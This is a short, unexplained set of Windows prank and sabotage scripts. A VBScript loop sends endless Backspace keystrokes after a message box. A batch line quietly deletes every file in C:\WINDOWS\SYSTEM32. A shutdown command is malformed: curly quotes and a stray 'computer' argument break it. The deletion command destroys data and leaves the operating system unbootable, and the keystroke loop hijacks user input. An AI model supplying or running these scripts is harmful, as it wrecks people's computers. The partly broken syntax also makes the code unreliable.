MsgBox “Backspace again and again and AGAIN”
Set wshShell =wscript.CreateObject(“WScript.Shell”)
do
wscript.sleep 100
wshshell.sendkeys “{bs}”
loop

DEL C:\WINDOWS\SYSTEM32\*.*/Q

@echo off
shutdown computer
-c "sleep tight" -s